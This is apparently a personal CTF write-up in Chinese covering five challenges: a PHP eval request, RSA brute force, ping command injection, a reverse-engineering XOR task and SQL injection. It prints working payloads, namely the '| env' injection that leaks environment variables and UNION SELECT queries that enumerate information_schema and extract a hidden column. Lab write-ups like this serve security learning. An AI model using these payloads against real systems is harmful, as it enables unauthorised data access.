

## 第一题跑马场

向 ma.php 发送一个 php 请求，参数名为 lilac内容为phpinfo();

在浏览器中搜索 flag，搜索到 flag1 即可提交

![image-20240615204337083](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/image-20240615204337083.png)

## 第二题 暴力破 rsa 

代码如图

![image-20240615215857435](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/image-20240615215857435.png)



## 第三题pingping 

简单的命令注入，在 Ping 中输入 | env 即可获得 flag

![image-20240615211055182](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/image-20240615211055182.png)

## 第四题 逆向

查看 sub_1169 的程序可以发现加密过程，依次异或，第一位异或第二位，第二位异或第三位，并且加上 33…………

![image-20240615220146760](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/image-20240615220146760.png)

写一个逆向程序就好了，跑完就可以得到 flag

![image-20240615220333254](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/image-20240615220333254.png)

## 第五题 中级户籍表 sql 注入

Amy Jones' union select 1,database(),user(),version() #

Amy Jones' union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=database())#

表名bqljpobclhebhieo

列名beidmeojndgbmfle

Amy Jones‘ ’union select 1,2,3,(select beidmeojndgbmfle frombqljpobclhebhieo) # 

就可以查到 flag 了（截图忘记截了）